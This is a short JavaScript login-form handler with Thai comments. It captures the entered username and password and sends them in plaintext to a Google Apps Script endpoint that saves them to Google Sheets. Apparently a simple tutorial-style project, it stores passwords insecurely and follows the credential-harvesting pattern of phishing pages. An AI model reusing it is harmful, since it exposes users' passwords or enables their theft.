document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // ป้องกันการส่งแบบฟอร์มไปที่เซิร์ฟเวอร์

    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;

    // URL ของ Google Apps Script ที่คุณคัดลอกมา
    const scriptURL = 'https://script.google.com/macros/s/AKfycbytZRKSOYnqY0-oOrJ9B6gpIqrqUu0nFfP5qrkDsDOl3I4AACxqbBYou1EYSAcQ6C40/exec';

    // สร้างข้อมูลที่ต้องการส่ง
    let formData = {
        username: username,
        password: password
    };

    // ส่งข้อมูลไปยัง Google Sheets
    fetch(scriptURL, {
        method: 'POST',
        body: JSON.stringify(formData),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.text())
    .then(result => {
        console.log('Success:', result);
        alert('Login data saved successfully');
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error saving login data');
    });
});
